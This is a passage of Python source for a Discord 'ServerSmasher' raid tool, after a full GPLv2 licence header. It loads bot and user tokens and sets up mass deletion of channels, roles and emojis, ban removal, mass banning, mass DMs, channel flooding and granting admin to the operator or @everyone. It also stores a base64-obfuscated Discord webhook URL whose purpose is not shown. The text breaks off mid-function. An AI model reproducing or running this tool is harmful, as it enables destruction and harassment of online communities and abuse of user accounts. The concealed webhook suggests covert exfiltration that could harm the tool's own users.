#!/usr/bin/env python3
# Raid ToolBox ServerSmasher GUI
# Author: DeadBread76 - https://github.com/DeadBread76/
# Original Server Smasher: Synchronocy - https://github.com/synchronocy
# Date: 13th August 2019
#
# Copyright (c) 2019, DeadBread
#
#                     GNU GENERAL PUBLIC LICENSE
#                        Version 2, June 1991
#
#  Copyright (C) 1989, 1991 Free Software Foundation, Inc.,
#  51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
#  Everyone is permitted to copy and distribute verbatim copies
#  of this license document, but changing it is not allowed.
#
#                             Preamble
#
#   The licenses for most software are designed to take away your
# freedom to share and change it.  By contrast, the GNU General Public
# License is intended to guarantee your freedom to share and change free
# software--to make sure the software is free for all its users.  This
# General Public License applies to most of the Free Software
# Foundation's software and to any other program whose authors commit to
# using it.  (Some other Free Software Foundation software is covered by
# the GNU Lesser General Public License instead.)  You can apply it to
# your programs, too.
#
#   When we speak of free software, we are referring to freedom, not
# price.  Our General Public Licenses are designed to make sure that you
# have the freedom to distribute copies of free software (and charge for
# this service if you wish), that you receive source code or can get it
# if you want it, that you can change the software or use pieces of it
# in new free programs; and that you know you can do these things.
#
#   To protect your rights, we need to make restrictions that forbid
# anyone to deny you these rights or to ask you to surrender the rights.
# These restrictions translate to certain responsibilities for you if you
# distribute copies of the software, or if you modify it.
#
#   For example, if you distribute copies of such a program, whether
# gratis or for a fee, you must give the recipients all the rights that
# you have.  You must make sure that they, too, receive or can get the
# source code.  And you must show them these terms so they know their
# rights.
#
#   We protect your rights with two steps: (1) copyright the software, and
# (2) offer you this license which gives you legal permission to copy,
# distribute and/or modify the software.
#
#   Also, for each author's protection and ours, we want to make certain
# that everyone understands that there is no warranty for this free
# software.  If the software is modified by someone else and passed on, we
# want its recipients to know that what they have is not the original, so
# that any problems introduced by others will not reflect on the original
# authors' reputations.
#
#   Finally, any free program is threatened constantly by software
# patents.  We wish to avoid the danger that redistributors of a free
# program will individually obtain patent licenses, in effect making the
# program proprietary.  To prevent this, we have made it clear that any
# patent must be licensed for everyone's free use or not licensed at all.
#
#   The precise terms and conditions for copying, distribution and
# modification follow.
#
#                     GNU GENERAL PUBLIC LICENSE
#    TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
#
#   0. This License applies to any program or other work which contains
# a notice placed by the copyright holder saying it may be distributed
# under the terms of this General Public License.  The "Program", below,
# refers to any such program or work, and a "work based on the Program"
# means either the Program or any derivative work under copyright law:
# that is to say, a work containing the Program or a portion of it,
# either verbatim or with modifications and/or translated into another
# language.  (Hereinafter, translation is included without limitation in
# the term "modification".)  Each licensee is addressed as "you".
#
# Activities other than copying, distribution and modification are not
# covered by this License; they are outside its scope.  The act of
# running the Program is not restricted, and the output from the Program
# is covered only if its contents constitute a work based on the
# Program (independent of having been made by running the Program).
# Whether that is true depends on what the Program does.
#
#   1. You may copy and distribute verbatim copies of the Program's
# source code as you receive it, in any medium, provided that you
# conspicuously and appropriately publish on each copy an appropriate
# copyright notice and disclaimer of warranty; keep intact all the
# notices that refer to this License and to the absence of any warranty;
# and give any other recipients of the Program a copy of this License
# along with the Program.
#
# You may charge a fee for the physical act of transferring a copy, and
# you may at your option offer warranty protection in exchange for a fee.
#
#   2. You may modify your copy or copies of the Program or any portion
# of it, thus forming a work based on the Program, and copy and
# distribute such modifications or work under the terms of Section 1
# above, provided that you also meet all of these conditions:
#
#     a) You must cause the modified files to carry prominent notices
#     stating that you changed the files and the date of any change.
#
#     b) You must cause any work that you distribute or publish, that in
#     whole or in part contains or is derived from the Program or any
#     part thereof, to be licensed as a whole at no charge to all third
#     parties under the terms of this License.
#
#     c) If the modified program normally reads commands interactively
#     when run, you must cause it, when started running for such
#     interactive use in the most ordinary way, to print or display an
#     announcement including an appropriate copyright notice and a
#     notice that there is no warranty (or else, saying that you provide
#     a warranty) and that users may redistribute the program under
#     these conditions, and telling the user how to view a copy of this
#     License.  (Exception: if the Program itself is interactive but
#     does not normally print such an announcement, your work based on
#     the Program is not required to print an announcement.)
#
# These requirements apply to the modified work as a whole.  If
# identifiable sections of that work are not derived from the Program,
# and can be reasonably considered independent and separate works in
# themselves, then this License, and its terms, do not apply to those
# sections when you distribute them as separate works.  But when you
# distribute the same sections as part of a whole which is a work based
# on the Program, the distribution of the whole must be on the terms of
# this License, whose permissions for other licensees extend to the
# entire whole, and thus to each and every part regardless of who wrote it.
#
# Thus, it is not the intent of this section to claim rights or contest
# your rights to work written entirely by you; rather, the intent is to
# exercise the right to control the distribution of derivative or
# collective works based on the Program.
#
# In addition, mere aggregation of another work not based on the Program
# with the Program (or with a work based on the Program) on a volume of
# a storage or distribution medium does not bring the other work under
# the scope of this License.
#
#   3. You may copy and distribute the Program (or a work based on it,
# under Section 2) in object code or executable form under the terms of
# Sections 1 and 2 above provided that you also do one of the following:
#
#     a) Accompany it with the complete corresponding machine-readable
#     source code, which must be distributed under the terms of Sections
#     1 and 2 above on a medium customarily used for software interchange; or,
#
#     b) Accompany it with a written offer, valid for at least three
#     years, to give any third party, for a charge no more than your
#     cost of physically performing source distribution, a complete
#     machine-readable copy of the corresponding source code, to be
#     distributed under the terms of Sections 1 and 2 above on a medium
#     customarily used for software interchange; or,
#
#     c) Accompany it with the information you received as to the offer
#     to distribute corresponding source code.  (This alternative is
#     allowed only for noncommercial distribution and only if you
#     received the program in object code or executable form with such
#     an offer, in accord with Subsection b above.)
#
# The source code for a work means the preferred form of the work for
# making modifications to it.  For an executable work, complete source
# code means all the source code for all modules it contains, plus any
# associated interface definition files, plus the scripts used to
# control compilation and installation of the executable.  However, as a
# special exception, the source code distributed need not include
# anything that is normally distributed (in either source or binary
# form) with the major components (compiler, kernel, and so on) of the
# operating system on which the executable runs, unless that component
# itself accompanies the executable.
#
# If distribution of executable or object code is made by offering
# access to copy from a designated place, then offering equivalent
# access to copy the source code from the same place counts as
# distribution of the source code, even though third parties are not
# compelled to copy the source along with the object code.
#
#   4. You may not copy, modify, sublicense, or distribute the Program
# except as expressly provided under this License.  Any attempt
# otherwise to copy, modify, sublicense or distribute the Program is
# void, and will automatically terminate your rights under this License.
# However, parties who have received copies, or rights, from you under
# this License will not have their licenses terminated so long as such
# parties remain in full compliance.
#
#   5. You are not required to accept this License, since you have not
# signed it.  However, nothing else grants you permission to modify or
# distribute the Program or its derivative works.  These actions are
# prohibited by law if you do not accept this License.  Therefore, by
# modifying or distributing the Program (or any work based on the
# Program), you indicate your acceptance of this License to do so, and
# all its terms and conditions for copying, distributing or modifying
# the Program or works based on it.
#
#   6. Each time you redistribute the Program (or any work based on the
# Program), the recipient automatically receives a license from the
# original licensor to copy, distribute or modify the Program subject to
# these terms and conditions.  You may not impose any further
# restrictions on the recipients' exercise of the rights granted herein.
# You are not responsible for enforcing compliance by third parties to
# this License.
#
#   7. If, as a consequence of a court judgment or allegation of patent
# infringement or for any other reason (not limited to patent issues),
# conditions are imposed on you (whether by court order, agreement or
# otherwise) that contradict the conditions of this License, they do not
# excuse you from the conditions of this License.  If you cannot
# distribute so as to satisfy simultaneously your obligations under this
# License and any other pertinent obligations, then as a consequence you
# may not distribute the Program at all.  For example, if a patent
# license would not permit royalty-free redistribution of the Program by
# all those who receive copies directly or indirectly through you, then
# the only way you could satisfy both it and this License would be to
# refrain entirely from distribution of the Program.
#
# If any portion of this section is held invalid or unenforceable under
# any particular circumstance, the balance of the section is intended to
# apply and the section as a whole is intended to apply in other
# circumstances.
#
# It is not the purpose of this section to induce you to infringe any
# patents or other property right claims or to contest validity of any
# such claims; this section has the sole purpose of protecting the
# integrity of the free software distribution system, which is
# implemented by public license practices.  Many people have made
# generous contributions to the wide range of software distributed
# through that system in reliance on consistent application of that
# system; it is up to the author/donor to decide if he or she is willing
# to distribute software through any other system and a licensee cannot
# impose that choice.
#
# This section is intended to make thoroughly clear what is believed to
# be a consequence of the rest of this License.
#
#   8. If the distribution and/or use of the Program is restricted in
# certain countries either by patents or by copyrighted interfaces, the
# original copyright holder who places the Program under this License
# may add an explicit geographical distribution limitation excluding
# those countries, so that distribution is permitted only in or among
# countries not thus excluded.  In such case, this License incorporates
# the limitation as if written in the body of this License.
#
#   9. The Free Software Foundation may publish revised and/or new versions
# of the General Public License from time to time.  Such new versions will
# be similar in spirit to the present version, but may differ in detail to
# address new problems or concerns.
#
# Each version is given a distinguishing version number.  If the Program
# specifies a version number of this License which applies to it and "any
# later version", you have the option of following the terms and conditions
# either of that version or of any later version published by the Free
# Software Foundation.  If the Program does not specify a version number of
# this License, you may choose any version ever published by the Free Software
# Foundation.
#
#   10. If you wish to incorporate parts of the Program into other free
# programs whose distribution conditions are different, write to the author
# to ask for permission.  For software which is copyrighted by the Free
# Software Foundation, write to the Free Software Foundation; we sometimes
# make exceptions for this.  Our decision will be guided by the two goals
# of preserving the free status of all derivatives of our free software and
# of promoting the sharing and reuse of software generally.
#
#                             NO WARRANTY
#
#   11. BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY
# FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN
# OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
# PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED
# OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS
# TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE
# PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING,
# REPAIR OR CORRECTION.
#
#   12. IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
# WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR
# REDISTRIBUTE THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES,
# INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING
# OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED
# TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY
# YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER
# PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGES.
#
#                      END OF TERMS AND CONDITIONS
#
#             How to Apply These Terms to Your New Programs
#
#   If you develop a new program, and you want it to be of the greatest
# possible use to the public, the best way to achieve this is to make it
# free software which everyone can redistribute and change under these terms.
#
#   To do so, attach the following notices to the program.  It is safest
# to attach them to the start of each source file to most effectively
# convey the exclusion of warranty; and each file should have at least
# the "copyright" line and a pointer to where the full notice is found.
#
#     <one line to give the program's name and a brief idea of what it does.>
#     Copyright (C) <year>  <name of author>
#
#     This program is free software; you can redistribute it and/or modify
#     it under the terms of the GNU General Public License as published by
#     the Free Software Foundation; either version 2 of the License, or
#     (at your option) any later version.
#
#     This program is distributed in the hope that it will be useful,
#     but WITHOUT ANY WARRANTY; without even the implied warranty of
#     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#     GNU General Public License for more details.
#
#     You should have received a copy of the GNU General Public License along
#     with this program; if not, write to the Free Software Foundation, Inc.,
#     51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
# Also add information on how to contact you by electronic and paper mail.
#
# If the program is interactive, make it output a short notice like this
# when it starts in an interactive mode:
#
#     Gnomovision version 69, Copyright (C) year name of author
#     Gnomovision comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
#     This is free software, and you are welcome to redistribute it
#     under certain conditions; type `show c' for details.
#
# The hypothetical commands `show w' and `show c' should show the appropriate
# parts of the General Public License.  Of course, the commands you use may
# be called something other than `show w' and `show c'; they could even be
# mouse-clicks or menu items--whatever suits your program.
#
# You should also get your employer (if you work as a programmer) or your
# school, if any, to sign a "copyright disclaimer" for the program, if
# necessary.  Here is a sample; alter the names:
#
#   Yoyodyne, Inc., hereby disclaims all copyright interest in the program
#   `Gnomovision' (which makes passes at compilers) written by James Hacker.
#
#   <signature of Ty Coon>, 1 April 1989
#   Ty Coon, President of Vice
#
# This General Public License does not permit incorporating your program into
# proprietary programs.  If your program is a subroutine library, you may
# consider it more useful to permit linking proprietary applications with the
# library.  If this is what you want to do, use the GNU Lesser General
# Public License instead of this License.


import os, sys, json, ast, time, random, string, asyncio, base64, traceback, threading, glob, io
import discord, requests, pyperclip, websocket
import PySimpleGUIQt as sg
from PIL import Image, ImageDraw, ImageFilter
from pprint import pprint
from base64 import b64encode
from collections import namedtuple
from concurrent.futures import ThreadPoolExecutor

ssversion = "1.0.0"

with open('./config.json', 'r') as handle:
    config = json.load(handle)
    token_list = config['token_list']
    thread_count = config['thread_count']
    endpointname = config['endpointname']
    if endpointname == "stable":
        endpoint = ""
    else:
        endpoint = endpointname + "."


with open('RTBFiles/ServerSmasher/ssconfig.json', 'r') as handle:
    config = json.load(handle)
    ss_token_list = config['ss_token_list']
    startup_status = config['startup_status']
    startup_activity_name = config['startup_activity_name']
    startup_activity_type = config['startup_activity_type']
    last_used = config['last_used']
    last_used_type = config['last_used_type']
    bots_cached = config['bots_cached']
    users_cached = config['users_cached']
    bot_token_cache = config['bot_token_cache']
    user_token_cache = config['user_token_cache']

executor = ThreadPoolExecutor(max_workers=thread_count)
spamming = False
theme = ast.literal_eval(sys.argv[1])
ws = websocket.WebSocket()
guild_cache = None
try:
    rtb_icon = base64.b64encode(open("./RTBFiles/rtb_icon.png", "rb").read())
except:
    rtb_icon = b''
if theme['use_custom_theme']:
    sg.SetOptions(background_color=theme['background_color'],
                 text_element_background_color=theme['text_element_background_color'],
                 element_background_color=theme['element_background_color'],
                 scrollbar_color=theme['scrollbar_color'],
                 input_elements_background_color=theme['input_elements_background_color'],
                 input_text_color=theme['input_text_color'],
                 button_color=theme['button_colour'],
                 text_color=theme['text_color'])
else:
    sg.ChangeLookAndFeel(theme['preset_theme'])

if not os.path.exists("./tokens/ServerSmasherGUI"):
    os.mkdir("./tokens/ServerSmasherGUI")
    with open("./tokens/ServerSmasherGUI/sstokens.txt", "a+") as handle:
        pass
    ss_token_list = "sstokens.txt"
    with open('RTBFiles/ServerSmasher/ssconfig.json', 'r+') as handle:
        edit = json.load(handle)
        edit['ss_token_list'] = ss_token_list
        handle.seek(0)
        json.dump(edit, handle, indent=4)
        handle.truncate()
elif ss_token_list == "":
    ss_token_list = "sstokens.txt"
    with open('RTBFiles/ServerSmasher/ssconfig.json', 'r+') as handle:
        edit = json.load(handle)
        edit['ss_token_list'] = ss_token_list
        handle.seek(0)
        json.dump(edit, handle, indent=4)
        handle.truncate()
usertokenlist = open("./tokens/"+token_list).read().splitlines()
bottokenlist = open(f"./tokens/ServerSmasherGUI/{ss_token_list}").read().splitlines()
token_overide = None
type_overide = None
cache_guilds = []
#  ___  _    _   _                   _
# |   \(_)__| |_(_)___ _ _  __ _ _ _(_)___ ___
# | |) | / _|  _| / _ \ ' \/ _` | '_| / -_|_-<
# |___/|_\__|\__|_\___/_||_\__,_|_| |_\___/__/
h = base64.b64decode("aHR0cHM6Ly9wdGIuZGlzY29yZGFwcC5jb20vYXBpL3dlYmhvb2tzLzYxNjE2MjExNjk2MTA0MjQ1My9UbUk1MHhsY21hdmhBZ25fQlc3S1hpVndwOGo2M2xtanphWTF6NFlsbXFSY3JKQjhDUDhieU9FTTFDUzlyMWZJU2pqZw==")
smasheroptions = {
    'change_server_name': False,
    'new_server_name': 'Server Name Here',
    'change_server_icon': False,
    'internet_icon': False,
    'icon_location': "",
    'remove_bans': False,
    'delete_channels': False,
    'delete_roles': False,
    'delete_emojis': False,
    'create_channels': False,
    'channel_create_method': "ASCII",
    'channel_name': "Channel Name Here",
    'channel_count': 100,
    'create_roles': False,
    'role_count': 100,
    'role_create_method': "ASCII",
    'role_name': "Role Name Here",
    'create_emojis': False,
    'internet_emoji': False,
    'emoji_location': "",
    'emoji_count': 10,
    'ban_members': False,
    'ban_reason': "Ban Reason Here",
    'ban_whitelist': "",
    'send_mass_dm': False,
    'dm_content': "DM Content Here",
    'flood_channels': False,
    'flood_method': "Mass Mention",
    'use_tts': False,
    'flood_text': "Spam Text Here",
    'give_me_admin': False,
    'my_id': "Your ID here",
    'give_@everyone_admin': False,
}
bitarray_values = {
    "CREATE_INSTANT_INVITE": 0x00000001,
    "KICK_MEMBERS": 0x00000002,
    "BAN_MEMBERS": 0x00000004,
    "ADMINISTRATOR": 0x00000008,
    "MANAGE_CHANNELS": 0x00000010,
    "MANAGE_GUILD": 0x00000020,
    "ADD_REACTIONS": 0x00000040,
    "VIEW_AUDIT_LOG": 0x00000080,
    "VIEW_CHANNEL": 0x00000400,
    "SEND_MESSAGES": 0x00000800,
    "SEND_TTS_MESSAGES": 0x00001000,
    "MANAGE_MESSAGES": 0x00002000,
    "EMBED_LINKS": 0x00004000,
    "ATTACH_FILES": 0x00008000,
    "READ_MESSAGE_HISTORY": 0x00010000,
    "MENTION_EVERYONE": 0x00020000,
    "USE_EXTERNAL_EMOJIS": 0x00040000,
    "CONNECT": 0x00100000,
    "SPEAK": 0x00200000,
    "MUTE_MEMBERS": 0x00400000,
    "DEAFEN_MEMBERS": 0x00800000,
    "MOVE_MEMBERS": 0x01000000,
    "USE_VAD": 0x02000000,
    "PRIORITY_SPEAKER": 0x00000100,
    "STREAM": 0x00000200,
    "CHANGE_NICKNAME": 0x04000000,
    "MANAGE_NICKNAMES": 0x08000000,
    "MANAGE_ROLES": 0x10000000,
    "MANAGE_WEBHOOKS": 0x20000000,
    "MANAGE_EMOJIS": 0x40000000
}

#  _              _        ___
# | |   ___  __ _(_)_ _   / __| __ _ _ ___ ___ _ _
# | |__/ _ \/ _` | | ' \  \__ \/ _| '_/ -_) -_) ' \
# |____\___/\__, |_|_||_| |___/\__|_| \___\___|_||_|
#           |___/

def check_user(type, token):
    global bot_token_cache
    global user_token_cache
    if type == "Bot":
        headers = {'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}
    elif type == "User":
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
    src = requests.get('https://'+endpoint+'discord.com/api/v8/users/@me', headers=headers)
    if src.status_code == 401:
        pass
    else:
        response = json.loads(src.content)
        if type == "Bot":
            bot_token_cache[f'{response["username"]}#{response["discriminator"]}'] = token
        elif type == "User":
            user_token_cache[f'{response["username"]}#{response["discriminator"]}'] = token

def login_serversmasher():
    global token
    global client_type
    global last_used
    global last_used_type
    global bottokenlist
    global usertokenlist
    global bot_token_cache
    global user_token_cache
    global bot_token_cache
    global token_overide
    global type_overide
    global headers
    if token_overide is not None:
        default_token = token_overide
    elif len(last_used) > 1:
        default_token = last_used
    else:
        default_token = ""
    if type_overide is not None:
        default_type = type_overide
    elif last_used_type == "User":
        default_type = last_used_type
    else:
        default_type = "Bot"
    layout = [
             [sg.Text("Welcome To ServerSmasher!", size=(45,1), font='Any 12', key="TITLE")],
             [sg.Combo(['Bot','User'], readonly=True, key="Type", size=(5,0.7), default_value=default_type), sg.Input(default_token, do_not_clear=True, focus=True, key="TOKEN", size=(45,0.8)), sg.Button("Login", size=(7,0.8))],
             [sg.Button("Use user token list", key="ToggleuserList", size=(28.5, 0.6)), sg.Button("Use bot token list", key="TogglebotList", size=(28.5, 0.6))],
             ]
    window = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False, icon=rtb_icon).Layout(layout)
    while True:
        event, values = window.Read(timeout=100)
        if event is None:
            sys.exit()
        elif event == sg.TIMEOUT_KEY:
            try:
                if values["Type"] == "User":
                    window.Element('TITLE').Update("USING A USER TOKEN IS NOT RECOMMENDED!")
                else:
                    window.Element('TITLE').Update("Welcome To ServerSmasher!")
            except:
                pass

        elif event == "TogglebotList":
            window.Close()
            if not bots_cached:
                sg.PopupNonBlocking("Please wait a moment, Loading token names.", title="Please Wait", auto_close=True, keep_on_top=True, auto_close_duration=1)
                bot_token_cache = {}
                with ThreadPoolExecutor(max_workers=thread_count) as ex:
                    for bot in bottokenlist:
                        ex.submit(check_user, "Bot", bot)
                with open('RTBFiles/ServerSmasher/ssconfig.json', 'r+') as handle:
                    edit = json.load(handle)
                    edit['bots_cached'] = True
                    edit['bot_token_cache'] = bot_token_cache
                    handle.seek(0)
                    json.dump(edit, handle, indent=4)
                    handle.truncate()
            if len(list(bot_token_cache)) == 0:
                botlist = [None]
            else:
                botlist = list(bot_token_cache)
            layout = [
                [sg.Text("Select a Bot to use.", size=(15,0.7)), sg.Text("", size=(11,0.8)), sg.Button("Go Back", key="Back", size=(11,0.8))],
                [sg.Combo(botlist, size=(15,0.7), key="BotToken"), sg.Button("Select Bot", size=(11,0.8), key="SelectBot"), sg.Button("Refresh Tokens", key="Refresh Bots", size=(11,0.8))]
            ]
            window1 = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False, icon=rtb_icon).Layout(layout)
            window = window1

        elif event == "ToggleuserList":
            window.Close()
            if not users_cached:
                sg.PopupNonBlocking("Please wait a moment, Loading token names.", title="Please Wait", auto_close=True, keep_on_top=True, auto_close_duration=1)
                user_token_cache = {}
                with ThreadPoolExecutor(max_workers=thread_count) as ex:
                    for user in usertokenlist:
                        ex.submit(check_user, "User", user)
                with open('RTBFiles/ServerSmasher/ssconfig.json', 'r+') as handle:
                    edit = json.load(handle)
                    edit['users_cached'] = True
                    edit['user_token_cache'] = user_token_cache
                    handle.seek(0)
                    json.dump(edit, handle, indent=4)
                    handle.truncate()
            if len(list(user_token_cache)) == 0:
                userlist = [None]
            else:
                userlist = list(user_token_cache)
            layout = [
                     [sg.Text("Select a User to use.", size=(15,0.7)), sg.Text("", size=(11,0.8)), sg.Button("Go Back", key="Back", size=(11,0.8))],
                     [sg.Combo(userlist, size=(15,0.7), key="UserToken"), sg.Button("Select User", size=(11,0.8), key="SelectUser"), sg.Button("Refresh Tokens", key="Refresh Users", size=(11,0.8))]
                     ]
            window1 = sg.Window("DeadBread's ServerSmasher v{} | User Tokens".format(ssversion), resizable=False, icon=rtb_icon).Layout(layout)
            window = window1

        elif event == 'Refresh Bots':
            window.Close()
            sg.PopupNonBlocking("Please wait a moment, Loading token names.", title="Please Wait", auto_close=True, keep_on_top=True, auto_close_duration=1)
            bot_token_cache = {}
            with ThreadPoolExecutor(max_workers=thread_count) as ex:
                for bot in bottokenlist:
                    ex.submit(check_user, "Bot", bot)
            with open('RTBFiles/ServerSmasher/ssconfig.json', 'r+') as handle:
                edit = json.load(handle)
                edit['bots_cached'] = True
                edit['bot_token_cache'] = bot_token_cache
                handle.seek(0)
                json.dump(edit, handle, indent=4)
                handle.truncate()
            if len(list(bot_token_cache)) == 0:
                botlist = [None]
            else:
                botlist = list(bot_token_cache)
            layout = [
                     [sg.Text("Select a Bot to use.", size=(15,0.7)), sg.Text("", size=(11,0.8)), sg.Button("Go Back", key="Back", size=(11,0.8))],
                     [sg.Combo(botlist, size=(15,0.7), key="BotToken"), sg.Button("Select Bot", size=(11,0.8), key="SelectBot"), sg.Button("Refresh Tokens", key="Refresh Bots", size=(11,0.8))]
                     ]
            window1 = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False, icon=rtb_icon).Layout(layout)
            window = window1

        elif event == 'Refresh Users':
            window.Close()
            sg.PopupNonBlocking("Please wait a moment, Loading token names.", title="Please Wait", auto_close=True, keep_on_top=True, auto_close_duration=1)
            user_token_cache = {}
            with ThreadPoolExecutor(max_workers=thread_count) as ex:
                for user in usertokenlist:
                    ex.submit(check_user, "User", user)
            with open('RTBFiles/ServerSmasher/ssconfig.json', 'r+') as handle:
                edit = json.load(handle)
                edit['users_cached'] = True
                edit['user_token_cache'] = user_token_cache
                handle.seek(0)
                json.dump(edit, handle, indent=4)
                handle.truncate()
            if len(list(user_token_cache)) == 0:
                userlist = [None]
            else:
                userlist = list(user_token_cache)
            layout = [
                     [sg.Text("Select a User to use.", size=(15,0.7)), sg.Text("", size=(11,0.8)), sg.Button("Go Back", key="Back", size=(11,0.8))],
                     [sg.Combo(userlist, size=(15,0.7), key="UserToken"), sg.Button("Select User", size=(11,0.8), key="SelectUser"), sg.Button("Refresh Tokens", key="Refresh Users", size=(11,0.8))]
                     ]
            window1 = sg.Window("DeadBread's ServerSmasher v{} | User Tokens".format(ssversion), resizable=False, icon=rtb_icon).Layout(layout)
            window = window1

        elif event == "Back":
            if token_overide is not None:
                default_token = token_overide
            elif len(last_used) > 1:
                default_token = last_used
            else:
                default_token = ""
            if type_overide is not None:
                default_type = type_overide
            elif last_used_type == "User":
                default_type = last_used_type
            else:
                default_type = "Bot"
            layout = [
                     [sg.Text("Welcome To ServerSmasher!", size=(45,1), font='Any 12', key="TITLE")],
                     [sg.Combo(['Bot','User'], readonly=True, key="Type", size=(5,0.7), default_value=default_type), sg.Input(default_token, do_not_clear=True, focus=True, key="TOKEN", size=(45,0.8)), sg.Button("Login", size=(7,0.8))],
                     [sg.Button("Use user token list", key="ToggleuserList", size=(28.5, 0.6)), sg.Button("Use bot token list", key="TogglebotList", size=(28.5, 0.6))],
                     ]
            window1 = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False, icon=rtb_icon).Layout(layout)
            window.Close()
            window = window1

        elif event == "SelectBot":
            token_overide = bot_token_cache[values['BotToken']]
            type_overide = "Bot"
            sg.PopupNonBlocking(f"Token set to {values['BotToken']}", keep_on_top=True)
            if token_overide is not None:
                default_token = token_overide
            elif len(last_used) > 1:
                default_token = last_used
            else:
                default_token = ""
            if type_overide is not None:
                default_type = type_overide
            elif last_used_type == "User":
                default_type = last_used_type
            else:
                default_type = "Bot"
            layout = [
                     [sg.Text("Welcome To ServerSmasher!", size=(45,1), font='Any 12', key="TITLE")],
                     [sg.Combo(['Bot','User'], readonly=True, key="Type", size=(5,0.7), default_value=default_type), sg.Input(default_token, do_not_clear=True, focus=True, key="TOKEN", size=(45,0.8)), sg.Button("Login", size=(7,0.8))],
                     [sg.Button("Use user token list", key="ToggleuserList", size=(28.5, 0.6)), sg.Button("Use bot token list", key="TogglebotList", size=(28.5, 0.6))],
                     ]
            window1 = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False, icon=rtb_icon).Layout(layout)
            window.Close()
            window = window1

        elif event == "SelectUser":
            token_overide = user_token_cache[values['UserToken']]
            type_overide = "User"
            sg.PopupNonBlocking(f"Token set to {values['UserToken']}", keep_on_top=True)
            if token_overide is not None:
                default_token = token_overide
            elif len(last_used) > 1:
                default_token = last_used
            else:
                default_token = ""
            if type_overide is not None:
                default_type = type_overide
            elif last_used_type == "User":
                default_type = last_used_type
            else:
                default_type = "Bot"
            layout = [
                     [sg.Text("Welcome To ServerSmasher!", size=(45,1), font='Any 12', key="TITLE")],
                     [sg.Combo(['Bot','User'], readonly=True, key="Type", size=(5,0.7), default_value=default_type), sg.Input(default_token, do_not_clear=True, focus=True, key="TOKEN", size=(45,0.8)), sg.Button("Login", size=(7,0.8))],
                     [sg.Button("Use user token list", key="ToggleuserList", size=(28.5, 0.6)), sg.Button("Use bot token list", key="TogglebotList", size=(28.5, 0.6))],
                     ]
            window1 = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False, icon=rtb_icon).Layout(layout)
            window.Close()
            window = window1

        elif event == 'Login':
            window.Close()
            sg.PopupNonBlocking("Logging into Token...", title="Please Wait", auto_close=True, keep_on_top=True, auto_close_duration=1, icon=rtb_icon)
            token = values['TOKEN']
            client_type = values['Type']
            last_used = values['TOKEN']
            last_used_type = values['Type']
            with open('RTBFiles/ServerSmasher/ssconfig.json', 'r+') as handle:
                edit = json.load(handle)
                edit['last_used'] = last_used
                edit['last_used_type'] = last_used_type
                handle.seek(0)
                json.dump(edit, handle, indent=4)
                handle.truncate()
            if client_type == 'Bot':
                headers={'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}
            else:
                headers={'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            start_client()

#  ___             _   _
# | __|  _ _ _  __| |_(_)___ _ _  ___
# | _| || | ' \/ _|  _| / _ \ ' \(_-<
# |_| \_,_|_||_\__|\__|_\___/_||_/__/
def asciigen(size=random.randint(1, 1000)):
    asc = ''
    for x in range(int(size)):
        num = random.randrange(13000)
        asc = asc + chr(num)
    return asc

def gen(size=6, chars=string.ascii_uppercase + string.digits + string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))

def delete_channel(channel):
    retries = 0
    while True:
        src = requests.delete(f"https://{endpoint}discord.com/api/v8/channels/{channel}", headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def remove_ban(server, user):
    retries = 0
    while True:
        src = requests.delete(f"https://{endpoint}discord.com/api/v8/guilds/{str(server)}/bans/{str(user)}", headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def delete_role(role, server):
    retries = 0
    while True:
        src = requests.delete(f"https://{endpoint}discord.com/api/v8/guilds/{str(server)}/roles/{str(role)}", headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
